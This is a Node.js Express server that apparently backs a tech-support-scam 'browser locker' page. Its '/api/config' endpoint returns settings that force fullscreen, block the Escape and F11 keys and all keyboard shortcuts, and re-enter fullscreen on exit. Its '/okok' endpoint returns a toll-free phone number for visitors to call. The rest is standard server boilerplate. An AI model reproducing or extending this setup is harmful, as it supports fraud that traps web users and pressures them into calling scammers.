require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const app = express();

// Get PORT from environment variable (for deployment) or use 5000 for local
const PORT = process.env.PORT || 5000;

// CORS configuration for production and development
const allowedOrigins = [
  'http://localhost:3000',
  'http://localhost:5000',
  process.env.FRONTEND_URL,
  'https://reaxapp.vercel.app/',
].filter(Boolean); // Remove undefined values

const corsOptions = {
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);

    if (allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      if (process.env.NODE_ENV === 'development') {
        callback(null, true);
      } else {
        console.log('Blocked origin:', origin);
        callback(new Error('Not allowed by CORS'));
      }
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Accept'],
  optionsSuccessStatus: 200
};

// Middleware
app.use(cors(corsOptions));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Logging middleware for debugging
app.use((req, res, next) => {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${req.method} ${req.path} - Origin: ${req.headers.origin || 'no-origin'}`);
  next();
});

// ---------------------- API ROUTES ----------------------

app.get('/', (req, res) => {
  res.json({
    status: 'OK',
    message: 'Backend server is running successfully',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'development',
    endpoints: {
      health: '/health',
      phoneNumber: '/okok',
      config: '/api/config'
    }
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'OK',
    message: 'Server is healthy and running',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    environment: process.env.NODE_ENV || 'development'
  });
});

// Phone number endpoint
app.get('/okok', (req, res) => {
  console.log('📞 Phone number requested from:', req.headers.origin || 'unknown');

  const phoneNumber = process.env.PHONE_NUMBER || '855-550-2644';

  res.json({
    tfn: phoneNumber,
    timestamp: new Date().toISOString()
  });
});

// Config endpoint
app.get('/api/config', (req, res) => {
  res.json({
    enableFullscreenLock: true,
    blockEscapeKey: true,
    blockF11Key: true,
    blockAllKeyboardShortcuts: true,
    reEnterFullscreenOnExit: true,
    phoneNumber: process.env.PHONE_NUMBER || '855-550-2644',
    timestamp: new Date().toISOString()
  });
});

// Test endpoint
app.get('/api/test', (req, res) => {
  res.json({
    success: true,
    message: 'Backend is accessible',
    receivedFrom: req.headers.origin || 'unknown',
    timestamp: new Date().toISOString()
  });
});

// ---------------------- REACT FRONTEND HANDLING ----------------------

// Serve React static files (IMPORTANT)
app.use(express.static(path.join(__dirname, "build")));

// React SPA fallback (VERY IMPORTANT)
app.get("*", (req, res) => {
  const filePath = path.join(__dirname, "build", "index.html");
  res.sendFile(filePath, (err) => {
    if (err) {
      console.error("Error sending index.html:", err);
      res.status(500).send("Server Error");
    }
  });
});

// ---------------------- 404 HANDLER ----------------------
app.use((req, res) => {
  console.log('❌ 404 Not Found:', req.method, req.path);
  res.status(404).json({
    error: 'Not Found',
    message: `Cannot ${req.method} ${req.path}`,
    availableEndpoints: ['/', '/health', '/okok', '/api/config', '/api/test']
  });
});

// ---------------------- GLOBAL ERROR HANDLER ----------------------
app.use((err, req, res, next) => {
  console.error('❌ Server Error:', err.message);
  console.error(err.stack);

  res.status(err.status || 500).json({
    error: 'Internal Server Error',
    message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong',
    timestamp: new Date().toISOString()
  });
});

// ---------------------- START SERVER ----------------------
const server = app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════╗
║   🚀 Server Started Successfully!      ║
╠════════════════════════════════════════╣
║   Port:        ${PORT.toString().padEnd(25)}║
║   URL:         http://localhost:${PORT.toString().padEnd(14)}║
║   Environment: ${(process.env.NODE_ENV || 'development').padEnd(25)}║
║   Phone:       ${(process.env.PHONE_NUMBER || '855-550-2644').padEnd(25)}║
╠════════════════════════════════════════╣
║   Available Endpoints:                 ║
║   GET  /                               ║
║   GET  /health                         ║
║   GET  /okok                           ║
║   GET  /api/config                     ║
║   GET  /api/test                       ║
╚════════════════════════════════════════╝
  `);
});

// ---------------------- SHUTDOWN HANDLERS ----------------------
const gracefulShutdown = (signal) => {
  console.log(`\n${signal} signal received: closing HTTP server gracefully`);
  server.close(() => {
    console.log('✅ HTTP server closed');
    console.log('👋 Process terminated');
    process.exit(0);
  });

  setTimeout(() => {
    console.error('⚠️ Could not close connections in time, forcefully shutting down');
    process.exit(1);
  }, 10000);
};

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

process.on('uncaughtException', (err) => {
  console.error('💥 UNCAUGHT EXCEPTION! Shutting down...');
  console.error(err.name, err.message);
  console.error(err.stack);
  process.exit(1);
});

process.on('unhandledRejection', (err) => {
  console.error('💥 UNHANDLED REJECTION! Shutting down...');
  console.error(err.name, err.message);
  server.close(() => {
    process.exit(1);
  });
});
